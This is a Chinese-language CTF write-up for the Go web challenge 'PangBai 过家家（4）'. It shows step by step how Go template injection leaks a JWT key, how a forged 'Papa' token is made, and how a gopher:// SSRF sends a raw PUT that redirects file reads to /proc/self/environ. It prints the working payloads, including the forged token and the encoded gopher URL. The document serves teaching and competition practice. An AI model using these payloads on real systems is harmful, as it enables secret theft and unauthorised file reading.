# PangBai 过家家（4）

> 分类：Web

## 题目描述
Go 语言 Web 题，已开源（https://github.com/cnily03-hive/PangBai-Go）。`main.go` 定义了静态文件路由和三个路由：`/`、`/eye`、`/favorite`。`routeEye` 中 `tmpl.Execute` 存在 SSTI（模板注入），可泄露 JWT 密钥，再通过 Gopher 协议 SSRF 触发本地 PUT 请求读取文件。

## 考察知识点
- Go template SSTI（`{{ . }}`、`{{ .Config.JwtKey }}`、`{{ .Curl "url" }}`）
- JWT 伪造
- SSRF + Gopher 协议发送任意报文（构造 PUT 请求）
- 文件读取（`config.SignaturePath` 可被 PUT 修改）

## 解法
1. `/eye` 路由将输入作为模板字符串一部分，输入 `{{ .Config.JwtKey }}` 泄露 JWT 密钥：

```go
var config = Config{
    Name:          "PangBai 过家家 (4)",
    JwtKey:        RandString(64),
    SignaturePath: "./sign.txt",
}
```

2. `/favorite` 路由的 PUT 请求可修改 `config.SignaturePath`（文件读取路径），但要求 JWT 中 `Name == "Papa"`，且要求请求来自本地（`127.0.0.1`）。
3. `Helper.Curl` 方法可在服务端发起请求（SSRF）。由于 `curl` 命令带 `--`，只能发 GET，但可利用 Gopher 协议发送任意 TCP 报文（PUT 请求）。
4. 先用泄露的 JwtKey 签一个 `user=Papa` 的 JWT：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiUGFwYSJ9.tgAEnWZJGTa1_HIBlUQj8nzRs2M9asoWZ-JYAQuV0N0
```

5. 构造 PUT 请求原始报文，Body 为要读取的文件（如 `/proc/self/environ`），注意 Content-Length 必须正确且 Body 不含换行：

```http
PUT /favorite HTTP/1.1
Host: localhost:8000
Content-Type: text/plain
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiUGFwYSJ9.tgAEnWZJGTa1_HIBlUQj8nzRs2M9asoWZ-JYAQuV0N0
Content-Length: 18

/proc/self/environ
```

6. 编码后套上 Gopher（CyberChef 处理）：

```
gopher://localhost:8000/_PUT%20%2Ffavorite%20HTTP%2F1%2E1%0D%0AHost%3A%20localhost%3A8000%0D%0AContent%2DType%3A%20text%2Fplain%0D%0ACookie%3A%20token%3D...%0D%0AContent%2DLength%3A%2018%0D%0A%0D%0A%2Fproc%2Fself%2Fenviron
```

7. 在 `/eye` 路由访问 `{{ .Curl "gopher://..." }}` 触发，再访问 `/favorite` 读 FLAG。

## 参考答案
（未给出，见截图）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week4/web/pangbai4.html
